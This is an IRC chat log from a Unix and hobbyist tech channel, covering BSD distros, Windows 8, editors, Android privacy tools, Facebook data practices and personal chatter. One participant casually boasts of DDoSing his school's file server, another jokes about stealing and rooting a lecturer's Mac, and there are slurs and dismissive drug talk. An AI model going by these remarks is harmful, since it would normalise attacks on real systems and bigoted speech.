14:26     ampharos │  transparent terms bad idea
14:26     ampharos │  hard to read text

20:55       Rudolf │  but i never actually am
20:55         dcat │  if you really look through it, he's just voicing his opinions
20:55       ripper │  Bizzare opinions are cool :3
20:55         dcat │  which most of the time is right
20:55       ripper │  though I still didn't pinionanyywa :p

20:57       ripper │  You have that too NeoTerra  :3
20:57       ripper │  dcat: Aren't the majority of Hezbollah originally civilians( all?) 
20:57       ripper │  How does that make them shields?
20:57       ripper │  And then since we got talking about this, then shields for whom are they exactly?
20:57       ripper │  And I just want to comment something btw
20:58       ripper │  If this is going to lead to any fight or grudges or anything, I don't want to continue with it :3

21:19       Rudolf │  i dont think anyone even uses all the ms office features
21:19       zygotb │  ^
21:19       Rudolf │  all my papers are just basic Header 1, Header 2, norma ltext
21:19       Rudolf │  and a few pics pasted in

21:23       zygotb │  I would lodge a complaint if my college required me to use proprietary software as a prerequisite for normal assignments.
21:23       Rudolf │  mine does
21:23       Rudolf │  and i complained out loud during a lecture
21:23       Rudolf │  and got laughed at
21:23       zygotb │  I can see if the course is "MS Office How To..."
21:23       Rudolf │  i was trying to explain to the teacher
21:24       Rudolf │  how i cant use dropbox for my work
21:24       zygotb │  Smack those who dare laugh at your idealism!
21:24       Rudolf │  as i'm running <obscure os here>

21:24       Rudolf │  my school folder
21:25       Rudolf │  with my http server

21:25     NeoTerra │  sounds like you have some pretty stupid profs
21:25       zygotb │  "Teacher" needs to be taught a lesson.
21:25       Rudolf │  NeoTerra, that same lecturer is a total macfag
21:25       Rudolf │  and i tried to explain to him why non-free software is harmfull
21:25       zygotb │  "Hack" his Mac!
21:26     NeoTerra │  most of my profs use macs but they also appreciate and love Linux
21:26       zygotb │  Can you get unobserved physical access to this Mac/
21:26     NeoTerra │  one guy actually uses ubuntu on his thinkpad
21:26       Rudolf │  no zygotb 
21:26       zygotb │  :(
21:26       Rudolf │  right when i started my degree
21:26       Rudolf │  i was allout *nixer
21:26       Rudolf │  had gentoo running on a t40
21:26       zygotb │  Steal it, root it, then "return" it?
21:27       Rudolf │  lol
21:27       Rudolf │  worst i have done
21:27       Rudolf │  is ddosing the schools file server
21:27       Rudolf │  so the prof cant email us the assignment
21:27       Rudolf │  delayed it for another 2 weeks
21:27       zygotb │  Hehe
21:28       zygotb │  Look at me, promoting a conspiracy to commit an alleged "Mac hack!"
21:28         quit │  arduix

21:31       Rudolf │  do "Pot Noodles" exist in america?
21:32       zygotb │  Is that anything like "Cup 'o Noodles?"
21:32       Rudolf │  http://www.unilever.co.uk/Images/450---Pot_Noodle_Original_Curry_90g_tcm28-297340.jpg
21:32       Rudolf │  its that
21:32       Rudolf │  Cup 'o noodle
21:32       Rudolf │  is the one were you actually put into into a mug
21:32       Rudolf │  and add hot water
21:33       Rudolf │  a pot noodle is all in one
21:33       zygotb │  Yeah, we have a lot of different Asian food selections here.
21:33       Rudolf │  ramen is the staple of my diet
21:33       zygotb │  There's this one I go to called "Kilauea Market."
21:34       Rudolf │  yo
21:34       zygotb │  They have a huge selection of Asian foods.
21:34       Rudolf │  puerto rico is american right?
21:34       Rudolf │  like the fuck
21:34         quit │  shtols
21:34       Rudolf │  zygotb, asian food in the uk consists of
21:34       Rudolf │  takeaway restuarants and random markets
21:34       Rudolf │  asian fast food is best fast food
21:34       zygotb │  Technically, yes, Puerto Rico is an American territory, and citizens of PR may join the US military.
21:35       Rudolf │  could i join the us military
21:35       Rudolf │  as a british citezen
21:35       Rudolf │  without giving up my citizenship
21:35       zygotb │  Probably.
21:35       zygotb │  Depending on your situation, you could gain dual citizenship.
21:36       Rudolf │  its a shame one cant get tri citizenship
21:36       Rudolf │  i am already holding a netherlands and british citezenship
21:37       zygotb │  I bet if you're wealthy enough to pay taxes in 3 nations, you could have such.
21:37       zygotb │  Ahhh... Netherlands. Take me to Groenlo!
21:38       zygotb │  The Grolsch Brewery!
21:38       Rudolf │  lol
21:38       Rudolf │  my best memories is sinterklaas
21:38       Rudolf │  and fine mature cheese
21:38       zygotb │  Haha!
21:38       Rudolf │  if i end up dropping out of college
21:38       Rudolf │  i would very likely just move there
21:39       Rudolf │  and smoke weed every day
21:39       zygotb │  Weed costs money there.
21:39       Rudolf │  yes
21:39       zygotb │  But weed grows on trees!
21:39       Rudolf │  much cheaper than the uk though
21:39       Rudolf │  lol
21:39       Rudolf │  nl weather is too shit
21:39       Rudolf │  for weed to grow outside
21:40       zygotb │  Be smellin like Ino
21:40       zygotb │  indo
21:40       zygotb │  indoor
21:40       zygotb │  not Indonesian.
21:40       zygotb │  Even in Hawai'i weed is grown indoors.
21:41       Rudolf │  yeah
21:42       zygotb │  Bloody fascists passed a "Medical Marijuana" law here, but only let you grow 7 plants, only 3 of which may be "mature."
21:43       zygotb │  I spoke with one DEA agent and he said, "As long as there's only 7, you can have 7 20 foot tall plants, no problem."
21:44       Rudolf │  lol
21:44       Rudolf │  everyone knows marijuana is harmless
21:44       zygotb │  But huge plants take a long time to grow compared to smaller varieties.
21:44       Rudolf │  keeping that shit a crime
21:44       Rudolf │  only funds criminal empires
21:44       zygotb │  This longer period leads to increased exposure to pests and disease.
21:45       Rudolf │  i smoked some weird purple bud last night
21:45       zygotb │  So most growers tend to prefer the smaller, more potent, varieties.
21:47       zygotb │  Ergo the conundrum: Grow a felonious amount to acquire a ready supply of acceptably potent weed; or grow 7...
21:47       Rudolf │  yeah
21:47       zygotb │  And rotate.
21:47       Rudolf │  the marijuana laws, worldwide
21:47       Rudolf │  are broken as shit
21:48       zygotb │  Colorado is running out of weed!
21:48       zygotb │  ROFL!
21:48       Rudolf │  my dealer started selling ounces to me for 50 gbp
21:48       Rudolf │  normal price is 220 gbp
21:48       zygotb │  Ouch!
21:48       Rudolf │  and its good mids
21:48       Rudolf │  i dont even know what the catch is
21:48     NeoTerra │  I am loving this goa trance https://www.youtube.com/watch?v=ayeTQxM-_zs
21:48       zygotb │  I don't buy weed.
21:48       zygotb │  I'm too cheap.
21:49       zygotb │  People give me weed.

21:49       Rudolf │  i always thought this was a good mix NeoTerra 
21:50     NeoTerra │  Rudolf I said goa trance, but GoT trance is cool too lul
21:50         BigE │  zygotb: so that sort of makes you cheap in the same way that having your own chickens makes you too cheap to buy eggs
21:50       zygotb │  There's nothing like running through the jungle, hiding your plants, while the cops are flying around dropping cops off to cut those plants down.
21:50       Rudolf │  NeoTerra, yeah i noticed 
21:50       Rudolf │  just sparked my mind though
21:51     NeoTerra │  ahh I see, kk 
21:51       zygotb │  It's sort of a rush. Like combat.
21:51       zygotb │  But with different ruls.
21:52       zygotb │  rules
21:52       zygotb │  I would never harm a police officer.
21:53       zygotb │  BigE, that's a nicer way of saying it.

21:54       Rudolf │  daily reminder
21:55         BigE │  i dont know what to think
21:55         BigE │  i like the zuck picture though
21:55       Rudolf │  its true though
21:55       Rudolf │  people dont question how facebook makes money
21:55       Rudolf │  they store your information
21:55       Rudolf │  and use targetted ads
21:55       zygotb │  LoL
21:55       Rudolf │  and share your information
21:55       Rudolf │  with 3rd parties
21:56       Rudolf │  3 years without a facebook so far
21:56         BigE │  if you dont know how facebook makes their money, you are just ignorant
21:56       zygotb │  That's why I deleted my FB account.
21:56       Rudolf │  i deactivated back when you had to send them a letter in the mail
21:56       Rudolf │  to get it 100% deleted
21:56     ne0phyte │  I have a facebook account with close to no information about me
21:56         BigE │  ha
21:56         BigE │  100% deleted
21:56         BigE │  sure
21:56       Rudolf │  BigE, i know right
21:56       Rudolf │  its haunting
21:56     ne0phyte │  but the problem I see is other people. they can tell facebook ("suggest") you went to xy school, worked at xy and so on
21:56       Rudolf │  they are probably storing my data in some
21:57       zygotb │  I have FB "sock puppets."
21:57     ne0phyte │  even if you decline it's probably true
21:57       Rudolf │  yeah
21:57     ne0phyte │  so fb got some informations and you cant do shit
21:57       zygotb │  Just give out bogus info.
21:57       Rudolf │  facebook is just a gigantic mess of evil
21:57         BigE │  part of the problem is that other people have no sense of data privacy
21:57       zygotb │  ^
21:57       zygotb │  ^
21:57         BigE │  and just willy nilly add all the information they have on you
21:57       zygotb │  Bingo!
21:57         BigE │  without your persmission
21:58       Rudolf │  the thing i like most about not having facebook, is when i go to clubs bars
21:58         BigE │  which is part of how facebook builds those fantastic 'shadow profiles' on people
21:58       Rudolf │  nobody knows who i am
21:58       Rudolf │  and i can basicly do whatever i want
21:58       Rudolf │  with no chances of someone adding me on facebook
21:58       Rudolf │  and blabbing shit on my wall
21:58       Rudolf │  or in public w/e
21:58     ne0phyte │  I disabled all that
21:58       zygotb │  LoL That's great!
21:58     ne0phyte │  no tagging in pics, locations, posts. no postings on my wall etc. I still need fb for some ignorant friends
21:59     NeoTerra │  meh I don't really care about all the fb stuff, all my data is on file all over the place because I own guns
21:59         BigE │  that isnt the same thing though
21:59       Rudolf │  i'm nearly at the stage of considering burning my cell
21:59         BigE │  lol
21:59       Rudolf │  and getting a new sim
21:59       Rudolf │  with no data related to me on it
21:59       Rudolf │  my current sim has my name, address, security number etc
21:59       zygotb │  I checked for tags of myself in images... None to be found on FB.
22:00       zygotb │  I knew back when Verizon gave me my first phone - bad credit and all - that there was a reason...
22:01       zygotb │  This was around 2000.
22:01       Rudolf │  what was it?
22:01     ne0phyte │  still waiting for the day when they disable the mobile website
22:01       zygotb │  The spies wanted to spy!
22:01     ne0phyte │  the app requests basically all rights
22:01       zygotb │  Lot's apps do
22:02     ne0phyte │  I'm using Xposed framework and XPrivacy
22:02     NeoTerra │  BigE it pretty much is, all fb knows about me is my name and what I look like, not that I'm really concerned about that because my name is extremely common
22:02     ne0phyte │  most apps can't do shit on my phone
22:02     NeoTerra │  the government knows a ton more about me than anyone
22:02     ne0phyte │  not even check my imei
22:02       Rudolf │  cell contracts are evil
22:02       zygotb │  I use my gf's phone.
22:02       Rudolf │  i have never had one
22:02       Rudolf │  and i'm glad
22:02       zygotb │  I was in love with my first few cell phones.
22:03     ne0phyte │  oh in case you don't know: Xposed is a modified framework.apk for android with a plugin interface to replace/modify UI and behaviour without the need for a custom rom
22:03       zygotb │  Now I see them for what they actually are.
22:03       zygotb │  ne0phyte, That sounds awesome.
22:03     ne0phyte │  it's a neat idea. but it's also a huge risk
22:04     ne0phyte │  3rd party developers get root level access + access to most system level classes and methods
22:04     ne0phyte │  so you need to be careful only to use open source plugins and build from well known developers
22:04       zygotb │  Can't that access be disabled?
22:05     ne0phyte │  no that's the idea behind Xposed. the plugin gets access to pretty much everything to be able to change fundamental things

22:06         BigE │  xposed is good if you use it as a low level protection, and dont let a whole bunch of other apps have access to it
22:06         BigE │  otherwise it doesnt help much
22:06       zygotb │  I've always thought about a mobile website that can access root level features on certain devices.
22:06     ne0phyte │  I only use gravitybox and xprivacy
22:07         BigE │  Xprivacy is the only plugin for it that i really found i needed
22:07         BigE │  xprivacy is pretty baller, but a pain in the ass to initially setup sometimes
22:07       zygotb │  How about OrBot & OrWeb?
22:07         BigE │  depending on the granularity you want
22:07         BigE │  zygotb: what about them>
22:07         BigE │  they are just apps
22:07       zygotb │  I was wondering if anyone else used them.
22:08         BigE │  oh
22:08         BigE │  i do
22:08         BigE │  well
22:08         BigE │  orbot anyways
22:08         BigE │  orweb not so much
22:08         BigE │  i just tunnel my FF browser through orbot
22:08     ne0phyte │  I wonder how open todays smartphones really are considering the "co-processor" aka gsm module + closed source baseband firmware
22:08       Rudolf │  BigE, does orbot staticly link tor
22:09         BigE │  well
22:09         BigE │  that is
22:09       Rudolf │  or something?
22:09         BigE │  IMO
22:09         BigE │  the big issue
22:09       zygotb │  It seems as if the mobile browsers have consistently dumbed-down their interfaces to make adjusting settings difficult.
22:09         BigE │  Rudolf: orbot is a java wrapper about the tor binary
22:09         BigE │  so i suspect that binary is statically linked

22:10       zygotb │  BigE, Affirmative.
22:10       Rudolf │  i wonder how badly windows 8(.1) actually flopped
22:11       Rudolf │  manufacturers have started adding a "win7" option
22:11       Rudolf │  to their oem machines
22:11       Rudolf │  because windows 8 is so terrible
22:11         BigE │  Rudolf: last i read, windows 8 was on 30 million machines
22:11         BigE │  worldwide
22:11       Rudolf │  yeah
22:11       Rudolf │  oem
22:11       Rudolf │  typical normies dont choose their os
22:11     ne0phyte │  if only they could do both things right in one release: kernel AND userland
22:11       Rudolf │  thats the damn problem
22:11         BigE │  sad considering that winxp is still on like fucking half a billion
22:11     ne0phyte │  this time the kernel got a lot better
22:11       Rudolf │  microsoft's jew claws
22:11       Rudolf │  are deep inside manufacturers machines
22:11       zygotb │  People fear change. They miss their "Start" button!
22:11       Rudolf │  giving the custoemrs no choice
22:12       Rudolf │  but to use windows X
22:12       Rudolf │  or whatever the hell microsoft ejaculated into it
22:12         BigE │  Rudolf: no, they are the exact opposite actually, M$ doesnt have any control over the OEM's
22:12       Rudolf │  then why is windows
22:12         BigE │  why do you think that laptop quality is absolute shit
22:12       Rudolf │  all over them
22:12       zygotb │  ???
22:12         BigE │  and everyone hates windows
22:12         BigE │  because MS sells it cheap
22:13     ne0phyte │  my ThinkPad isn't shit :C and I removed the windows license sticker and threw it away :D
22:13       zygotb │  M$ has exclusivity clauses with a lot of OEM.
22:13         BigE │  do you think that MS really wants to be known as the company that makes all those shitty HP laptops run?
22:13     ne0phyte │  it was a Vista license anyway
22:13       zygotb │  Those OEM are required to install M$ on their product.
22:14         BigE │  as much as we all hate windows 8, the surface tablet is a pretty solidly constructed
22:14       Rudolf │  wat
22:14         BigE │  because MS has complete control over the manufacture process
22:14       Rudolf │  if microsoft would just wise up
22:14       Rudolf │  and realize the the majority are still using a keyboard and mouse
22:14       Rudolf │  we wouldnt have the problem of windows 8
22:14     ne0phyte │  am I really the only one who actually likes W8 on a desktop? it's faster and more stable than 7 for me and I never used the awfully slow start-menu
22:15       zygotb │  I hate a touch screen UI.
22:15       Rudolf │  identity crisis
22:15       Rudolf │  ne0phyte, "stable"
22:15       Rudolf │  stop using that buzzword
22:15     ne0phyte │  what are you talking about? you never see that
22:15       Rudolf │  vanilla windows is always stable
22:15       Rudolf │  once you start installing 3rd party crapware
22:15       zygotb │  The very notion of touching my monitor is abhorrent.
22:15         BigE │  if microsoft decided to go the apple route, and just made their own hardware, albeit cheaper than apple stuff, and took away the tablet OS interface, then MS would no longer be associated with shit hardware or with a clunky OS
22:15       Rudolf │  it all goes to shit
22:16     ne0phyte │  I don't use stable as a buzzword. I can name concrete examples
22:16       Rudolf │  such as ne0phyte ?
22:17       Rudolf │  how is windows 8 more "stable" than windows 7
22:17       Rudolf │  in your personal experiences
22:17     ne0phyte │  the explorer, especially when handling many huge files is significantly faster. the UI never hangs for me when it did occasionally on w7
22:17       Rudolf │  faster != stable
22:17       zygotb │ is running E17
22:17     ne0phyte │  I don't consider freezes stable

22:18       Rudolf │  e17 is gros zygotb 
22:18         BigE │  i havent used win8, but from what my friends tell me, MS made a lot of improvements in startup, file handling, overall speed, etc

22:18     ne0phyte │  you rarely if ever see the interface ffs
22:18     ne0phyte │  I don't know how people use windows 8, but if they complain about that, then it must be an awfully inefficient way
22:19     ne0phyte │  win "app name" enter
22:19     ne0phyte │  no interaction with the mouse needed
22:19         BigE │  personally, i detest windows for its size and bloat
22:19     ne0phyte │  you can close your eyes while doing that if you wish
22:19       zygotb │  I just downloaded FreeBSD 10.0 RELEASE
22:19         BigE │  not the interface or anything like that
22:19       Rudolf │  if one calls GetVersion(Ex)
22:19       Rudolf │  on windows 8.1
22:19       Rudolf │  it returns the version for windows 8
22:19         BigE │  why the fuck does their OS need to be 30GB
22:19         BigE │  why
22:19       Rudolf │  and there is no way for a native (non-metro app)
22:19     ne0phyte │  that, however, is a good question
22:19       Rudolf │  to tell that its running on windows 8.,1
22:20         BigE │  like
22:20       Rudolf │  BigE, why is windows 30gb?

22:28       Rudolf │  its trying ot hard to be gnu/linux
22:28       libbro │  How so?
22:28       zygotb │  dat BSD license is what I like.
22:29       Rudolf │  zygotb, freebsd is the least bsd
22:29       Rudolf │  of all *bsd family
22:29         jmbi │  >FreeBSD
22:29         jmbi │  >bloat
22:29       Rudolf │  its userland is still largely gnu
22:29       Rudolf │  jmbi, its bloated as fuck
22:29       Rudolf │  especially compared to netbsd and openbsd
22:29       Rudolf │  only reason its considered "minimal"
22:29         jmbi │  but compared to virtually any other linux, it's pretty damn minimals
22:29       Rudolf │  is because no drivers exist to blote it up
22:29       Rudolf │  even more
22:29       libbro │  Bloated is a buzzword, be more specific
22:29         quit │  venam
22:29         jmbi │  i agree that FreeBSD is the most bloated of the BSD's
22:30       zygotb │  PC-BSD
22:30         jmbi │  yeah, that too
22:30         dcat │  openbsd masterrace
22:30       libbro │  PC-BSD is FreeBSD, right?
22:30         jmbi │  yup
22:30       libbro │  Okay, I got confused
22:30         jmbi │  DragonflyBSD doesn't even count
22:31       zygotb │  Nor should Ghost
22:31         jmbi │  they have like no graphics drivers
22:31       Rudolf │  dragonflybsd doesnt even have a purpose
22:31       Rudolf │  just some horrible hybrid kernel implementation
22:31         jmbi │  yeah, it's pretty useless
22:31       zygotb │  Both were no go here.
22:32       zygotb │  Same Xorg trip.
22:32         jmbi │  although this is interesting http://www.dragonflybsd.org/performance/

22:33       libbro │  Using it
22:33         dcat │  but it needs moar x86-64, and drivers
22:33         jmbi │  nah, stayed on FreeBSD to play with some software
22:33         join │  venam
22:33         jmbi │  i'm still trying to get plan9 on one of my servers
22:33       libbro │  FreeBSD is keeping desktop BSD alive whether you like it or not
22:33         jmbi │  so i can access it remotely
22:33         jmbi │  ^
22:33       libbro │  jmbi: Good idea
22:34       libbro │  jmbi: I feel like you have a basement filled with servers, jmbi
22:34         jmbi │  i have like 3
22:34       libbro │  And you host a variety of things ranging from web-servers to Tor hidden services
22:34       libbro │  jmbi: Oh...
22:34         jmbi │  but i don't use any of them anymore lel
22:35       zygotb │  I'm going to put the latest FreeBSD on a partition and use it whether or not Xorg builds and the bcm werx
22:35         jmbi │  and they are all too heavy for me to sell
22:35       libbro │  jmbi: lol. Use them for gaymen servers and MPD
22:35       zygotb │  Use them as a test-bed.
22:36       libbro │  If I had servers I'd do so much shit
22:36         jmbi │  yeah i told myself that too
22:36         jmbi │  then i realize all i do is watch youtube and masturbate
22:36       zygotb │  Setup your own attackable network and have fun.

00:53         BigE │  anyone run debian sid?
00:54       Rudolf │  yes
00:54         BigE │  any reason you run sid over testing?
00:54         BigE │  i have been running testing for like 2 years now
00:54       Rudolf │  autism really
00:55         BigE │  before that i did sid
00:55       Rudolf │  just because of the "more recent" packages
00:55       Rudolf │  but debian sid
00:55       Rudolf │  is nowhere near as bleeding edge as other distros
00:55         BigE │  but i am finding that sometimes testing has weird versioning breakages
00:55       Rudolf │  its all still pretty stable
00:55         BigE │  i am not looking for bleeding edge
00:55         BigE │  testing just seems to have a lot of fucked up versions
00:55      rudolf_ │  meh
00:55      rudolf_ │  just stick with testing
00:55      rudolf_ │  cant go wrong
00:55         BigE │  yeah
00:55      rudolf_ │  or just stable

00:56      rudolf_ │  wheezy
00:57         BigE │  yeah, 7.0 is stable now
00:57         BigE │  8.0 is jessie/testing
00:57         shix │  ive been using testing and nothing bad has ever happenend
00:57         shix │  unlike other distros
00:57         BigE │  lol
00:59         BigE │  one other thing i have noticed is that my desktop and laptop dont update at the same time
00:59       Rudolf │  people seem to forget
00:59         BigE │  they use the same U of Waterloo mirror
00:59       Rudolf │  that freebsd software is pretty much bleeding ede
00:59         BigE │  but i got a kernel upgrade on my laptop the other day that my desktop hasnt
00:59         BigE │  and they use the same sources.list
01:00         BigE │  which is just strange
01:03         shix │  apt-get is strange

01:19         BigE │  why the fuck
01:19         BigE │  they are both pulling from the same goddamn repo
01:20         BigE │  but somehow they have different package versions and different kernel versions

01:41         BigE │  and then you take that list
01:42         BigE │  and use your package manager to install them
01:42         jmbi │  don't mind BigE, he's an asshole
01:42         BigE │  wtf
01:42   pigpenguin │  got it thanks
01:42         shix │  lol
01:42   pigpenguin │  I installed xcb but didnt get the rest of them
01:43         BigE │  does 2bwm have to be compiled with the config?
01:43     ampharos │  yes
01:43         BigE │  k

03:20       libbro │  I was gonna say that ver batum
03:20       libbro │  Emacs is literally an OS

03:21         shix │  But yes, go with emacs, because emacs master race.

03:22         jmbi │  god damnit
03:22       libbro │  I guess I'll try using emacs for a bit
03:22       libbro │  But I think I'll just go back to Vim, because I feel at home
03:22       libbro │  using it
03:22         jmbi │  you can literally make emacs do anything you want

03:24       libbro │  shix: lol
03:24      lidstah │  emacs is a great editor (and much more), but I always end going back to vim because I'm really proficient with it (and well, there is a shitton of plugins to transform it in a fully fledged os-like thing like emacs, no pun intended)
03:24       libbro │  ^
03:25         shix │  yeah except vim script is ass
03:25       libbro │  Maybe I'll go from being a Vim Virgin to an Ecclectic Emacs Player
03:25         shix │  You can do so much more with elisp
03:25      lidstah │  shix: I'd agree on vimscript being stinky
03:26         shix │  plus you have all these http://www.emacswiki.org/emacs/Evil#toc5 to make it more vim like if you want
03:27   pigpenguin │  a vim emacs argument happened at my school the other day
03:27   pigpenguin │  it was funny to watch
03:28       libbro │  pigpenguin: Go on...
03:28      lidstah │  Tried this plugin too. But I think it… well, corrupt the way emacs is to be used
03:28       libbro │  ^
03:28   pigpenguin │  libbro: that was it, pretty much the standard arguments it was just really emotional

03:31       libbro │  I thought that vim and emacs were just autistic text-editors and that nano was the editor for rational people
03:31         shix │  it wasnt as good as yours though
03:31      lidstah │  hehe, started with ViM back in 1992, here (good ol'Amiga days). It's like an extension of my fingers nowadays.

03:32         dcat │  you need to netcat 
03:32      jjumbii │  libbro: yea, but it's not as nice
03:33      jjumbii │  with plan9 everything is seamless
03:33      lidstah │  pigpenguin: well, not as you'll customize ViM or Emacs, of course, but there is some options, and iirc (correct me if I'm wrong), even some plugins. Also, have a look at joe, it's said to be a pretty decent editor, too
03:33      jjumbii │  shix: still looks pretty sexy mange
03:33       libbro │  jjumbii: I guess you're right
03:33      jjumbii │  but it's still awesome none the less
03:33       libbro │  Why not both?
03:34      jjumbii │  why not both what?
03:34       libbro │  Plan9port and trve Plan9
03:34      jjumbii │  plan9port is just plan9 utils on linux/bsd
03:34         shix │  dcat: cat-v is too much for me

03:35         shix │  jjumbii: dude idk
03:35       libbro │  But, I guess I'll feel more comfortable with p9p and get better and finally use trve plan9
03:35      jjumbii │  i'm telling you, the best way is just to install it and use it every day for a week
03:36      jjumbii │  out of desperation, you'll figure things out
03:36      jjumbii │  just set your mind to it lel
03:36       libbro │  Okay

03:36         shix │  oh shit.. i just remembered i have an old desktop just gaining dust
03:36         shix │  i should install plan9 on it
03:37      jjumbii │  honestly, i might as well install it
03:37      jjumbii │  it's not like i do anything on here anyways
03:37      jjumbii │  at least on plan9 i can hack around
03:38         shix │  ive been too lazy to install anything
03:38         shix │  must be the marijuanas

04:41         BigE │  there was this good link on the subject 
04:41         BigE │  let me find it
04:41         quit │  jjumbii
04:42      bottomy │  can get a canary from pet store, then just to find a dead body, then my shit will be secure!
04:42         BigE │  actually
04:42         BigE │  that might be something i could make
04:42         BigE │  i cant find the link
04:42         BigE │  but basically
04:42         dcat │  :<
04:43         BigE │  what it is
04:43         BigE │  you set up a cron job
04:43         BigE │  or rsync job
04:43         BigE │  w/e
04:43         BigE │  and what you have on your website is a message, disclaimer, something
04:43         BigE │  that says 'We have never submitted to information requests'
04:43         BigE │  or something like that
04:44         BigE │  and what that cron job does
04:44         BigE │  is send an email say, once a week to your email account
04:44         BigE │  and if it doesnt receive a cryptographically signed message within say a week
04:44         BigE │  it removes that 'promise' from your services website
04:45         BigE │  so that means that even if you are legally gagged
04:45         BigE │  like what comes along with an NSL, from telling anyone
04:45         BigE │  your lack of action lets other people know what is going on
04:45         BigE │  and you cant be charged with breaking the gag
04:45         BigE │  cause you didnt say anything
04:45         dcat │  hmm
04:47         quit │  pigpenguin
04:50         BigE │  what do you think about a tool that would do that automatically?

10:35       Rudolf │  how old are you, if i may ask?
10:35       zygotb │  I think it was worse here about ten or so years ago.
10:35       zygotb │  I'm 50.
10:35       Rudolf │  guessing you work in the it sector
10:35       Rudolf │  its pretty uncommon for someone from your generation to be "l33t"
10:35       zygotb │  Not for many years.
10:35       Rudolf │  especially enough to figure out how to irc
10:36       zygotb │  I was an IT tech back in the mid 90's.
10:36       Rudolf │  ahh
10:36       Rudolf │  i'm a soon to be full time NEET
10:36       Rudolf │  with no education past hs school level
10:37       Rudolf │  dropping out of college due to sever mental health issues, my dream of being a code monkey
10:37       zygotb │  Got a chance to buy some land out in the boonies, so I gave up the city life.
10:37       Rudolf │  will never happen now
10:37       Rudolf │  ahh
10:37       zygotb │  Went cold turkey. No computer, no internet, etc. For years.
10:38       Rudolf │  was it worth it?
10:38       Rudolf │  i couldnt imagine my life
10:38       zygotb │  What is your education background?
10:38       Rudolf │  IT
10:38       Rudolf │  community college age 16-18
10:38       Rudolf │  then went to a cs degree
10:38       zygotb │  Nice.
10:38       Rudolf │  but i'm dropping out
10:38       zygotb │  I also dropped out of school.
10:39       Rudolf │  and just going to figure out what to do next, was diagnosed with severe adult adhd
10:39       Rudolf │  so until i get treatment i'm going on welfare + benefits for being unable to work
10:39       Rudolf │  zygotb, well did you end up
10:39       Rudolf │  making a decent life?
10:39       zygotb │  Ouch.
10:39       Rudolf │  even without a degree?
10:40       zygotb │  I joined the Army as soon as I was 18, but I got my GED right after I dropped out of high school.
10:40      bottomy │  heh I'm a dropout too :P
10:40       Rudolf │  i'm considering joining the armed forces too
10:40       Rudolf │  probably the british army
10:40       zygotb │  bottomy: Cheers!
10:40       Rudolf │  or the navy/raf
10:40       zygotb │  Go SAS.
10:41       zygotb │  Those are some badasses.
10:41       Rudolf │  yeah
10:41       Rudolf │  but people dont just get into the sas
10:41       Rudolf │  after signing up
10:41       zygotb │  Right...
10:41       Rudolf │  its normally 5-10 years in the army/marines/navy
10:41       Rudolf │  showing excellent skills
10:41       Rudolf │  or something along those lines
10:41       Rudolf │  but w/e i sign up to, it will be pathetic pay
10:41       Rudolf │  as an enlisted soldier
10:42       zygotb │  That's how it goes, start off with shit for pay and too much work.
10:42       Rudolf │  oh and problem 2)
10:42       Rudolf │  i'm 280lbs
10:42       Rudolf │  6'3
10:42       Rudolf │  which is like 80lbs overweight
10:42       zygotb │  If you excel, you get more responsibility, more pay, etc.
10:42       Rudolf │  yeah
10:43       zygotb │  Ah... I've always been thin.
10:43       Rudolf │  real the problem with adhd
10:43       zygotb │  Ectomorph.
10:43       Rudolf │  is generally substance abuse, excussive eating, excessive drug taking
10:43       Rudolf │  which has been quite a problem
10:44       zygotb │  If that's what ADHD is, then I too had an ADHD compulsion for beer.
10:44       Rudolf │  haha
10:44       zygotb │  I had my 1st sip of beer when I was 3 or 4 years old.
10:45       Rudolf │  well my psychologist said that people with adhd (and a few other illnesses)
10:45       Rudolf │  tend to get into drugs (beer + cigs included)
10:45       Rudolf │  at a much earlier age
10:45       Rudolf │  and tend to form addictive tendencies
10:45       Rudolf │  and abuse substances
10:45       zygotb │  I've never been a tobacco smoker.
10:45       Rudolf │  more than the "normal"
10:45       zygotb │  Never been a coffee drinker.
10:45       Rudolf │  hmm
10:46       zygotb │  But beer?
10:46       zygotb │  I can drink beer for breakfast.
10:46       Rudolf │  i tend to avoid beer myself
10:46       Rudolf │  all alchohol just makes me depressed
10:46       Rudolf │  yet when i have the cash
10:46       zygotb │  Lunch and dinner.
10:46       Rudolf │  i smoke tobacco and weed like a train
10:46         yrmt │  halp
10:46       zygotb │  Yes?
10:46         yrmt │  I need to sync a cvs with a git
10:46       Rudolf │  hi yrmt 
10:46         yrmt │  hai
10:47       Rudolf │ sits down again
10:47         yrmt │  should I set up a cron job to to pull from cvs and push to git
10:47         yrmt │  or is there some tool to make that easier
10:47       zygotb │  Meng, I've never CVS'd and I've rarely GIT'd...
10:48       zygotb │  But your cron idea should be workable.
10:48         yrmt │  yeah i'll try 
10:48       zygotb │  Hey, Happy New Year!
10:48         yrmt │  You too!
10:48         yrmt │  I'm having the best time on NetBSD right now
10:49       zygotb │  Awesome!
10:49      bottomy │  pretty straightforward to do, but there are already VC conversion tools or are you just talking about merging the latest stuff from the CVS to the git repo?
10:49       zygotb │  Have you any experience with FreeBSD in VirtualBox?
10:49         yrmt │  latter
10:49         yrmt │  yep
10:49         yrmt │  run perfectly
10:49         yrmt │  netbsd won't tar xf .tar.gz archives right, it throws cpio out of range errors
10:50         yrmt │  gzip -d ok.tar.gz; tar xf ok.tar.gz works though
10:50       zygotb │  I keep getting an error in Vbox when I try a FreeBSD iso.
10:50      bottomy │  ok not sure if there are any tools (might be) but regardless would simple enough to make a script
10:51       Rudolf │  netbsd and openbsd never seem to work correctly as guests on virtualbox
10:51       Rudolf │  one hack to get it to run
10:51       Rudolf │  and then 12 more hacks to fix the problems because of the initial hack
10:52       zygotb │  QEMU works better? 
10:52       zygotb │  Or VMWare?
10:52         yrmt │  bottomy: alright I'll do that 
10:52       Rudolf │  vmware
10:52       Rudolf │  worked perfect for me zygotb 
10:52       Rudolf │  for both netbsd and openbsd
10:52         yrmt │  Rudolf: u wot
10:52       zygotb │  Thanks Rudolf 
10:53         yrmt │  openbsd and netbsd work fine on virtualbox, vmware and qemu
10:53       Rudolf │  yrmt, guessing you have a 64 bit cpu with virtualization etc
10:53       Rudolf │  not everyone has that hardware
10:53       Rudolf │  and they dont run in virtualbox for me
10:53       Rudolf │  on a vanilla install on my hardware
10:54       zygotb │  I think I've got KVM enabled.
10:54       Rudolf │  kernel panic during boot, or forced restart due to lack of processor features
10:54         yrmt │  Rudolf: right
10:54       Rudolf │  well its worth a try first zygotb, didnt work on my hardware/setup
10:55       zygotb │  I'm shuttling stuff around to make room to install to my hdd.
11:15         yrmt │  yay the erlang port works
11:18      bottomy │  added erlang to pkgin?
11:18         yrmt │  yep
11:18      bottomy │  :D
11:19         yrmt │  wait
